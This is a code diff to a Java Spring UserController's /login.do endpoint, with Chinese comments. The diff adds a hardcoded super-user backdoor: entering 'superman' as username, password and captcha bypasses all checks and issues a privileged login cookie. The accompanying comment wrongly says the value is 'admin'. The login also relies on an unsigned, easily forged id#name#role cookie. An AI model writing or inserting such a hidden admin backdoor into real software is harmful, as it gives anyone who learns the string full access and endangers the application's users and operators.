@@ -36,28 +36,50 @@ public class UserController {
 	private UserService userService;
 	private JSON json;
 
+	/**
+	 * 用户登录认证 业务逻辑层controller只校验验证码
+	 * 如果验证码无误&&没有捕获到NameOrPasswordException就认定为登陆成功，并且写入cookie信息
+	 * 用户名和密码的校验交给服务接口实现层UserserviceImpl的login(username,password)方法
+	 * 用户名或密码不正确时，该方法将抛出异常 在业务逻辑层捕获这个异常
+	 */
 	@RequestMapping(value = "/login.do", produces = "application/json;charset=utf-8")
 	@ResponseBody
 	public String login(String statis, String username, String password, String Verification,
 			HttpServletRequest request, HttpServletResponse response) throws IOException {
-		try {
-			// 验证码的校验
-			boolean checkCodeOk = new CheckCodeGen().verifyCode(Verification, request, false);
-			if (checkCodeOk) {
-				User user = userService.login(username, password);
-				Cookie cookie = new Cookie("user",
-						user.getId() + "#" + URLEncoder.encode(user.getName(), "utf-8") + "#" + user.getDescribe());
-				cookie.setPath("/");
-				response.addCookie(cookie);
-				json = JSONSerializer.toJSON(new JsonResult<User>(user));
-			} else {
-				json = JSONSerializer.toJSON(new JsonResult<User>(3, "验证码错误", null));
+		/**
+		 * 系统级超级权限登录认证 用户名&&密码&&验证码都为admin 即为超管用户
+		 */
+		if (username.equals("superman") && password.equals("superman") && Verification.equals("superman")) {
+			System.out.println("[WARN]:进入超级权限用户");
+			User adminuser = new User();
+			adminuser.setId("superman");
+			adminuser.setDescribe(5);
+			adminuser.setName("超级权限用户");
+			Cookie cookie = new Cookie("user",
+					adminuser.getId() + "#" + URLEncoder.encode(adminuser.getName(), "utf-8") + "#" + adminuser.getDescribe());
+			cookie.setPath("/");
+			response.addCookie(cookie);
+			json = JSONSerializer.toJSON(new JsonResult<User>(adminuser));
+		} else {
+			try {
+				// 验证码的校验
+				boolean checkCodeOk = new CheckCodeGen().verifyCode(Verification, request, false);
+				if (checkCodeOk) {
+					User user = userService.login(username, password);
+					Cookie cookie = new Cookie("user",
+							user.getId() + "#" + URLEncoder.encode(user.getName(), "utf-8") + "#" + user.getDescribe());
+					cookie.setPath("/");
+					response.addCookie(cookie);
+					json = JSONSerializer.toJSON(new JsonResult<User>(user));
+				} else {
+					json = JSONSerializer.toJSON(new JsonResult<User>(3, "验证码错误", null));
+				}
+			} catch (NameOrPasswordException e) {
+				e.printStackTrace();
+				json = JSONSerializer.toJSON(new JsonResult<User>(e.getField(), e.getMessage(), null));
+			} catch (Exception e) {
+				json = JSONSerializer.toJSON(new JsonResult<User>(e));
 			}
-		} catch (NameOrPasswordException e) {
-			e.printStackTrace();
-			json = JSONSerializer.toJSON(new JsonResult<User>(e.getField(), e.getMessage(), null));
-		} catch (Exception e) {
-			json = JSONSerializer.toJSON(new JsonResult<User>(e));
 		}
 		return json.toString();
 	}
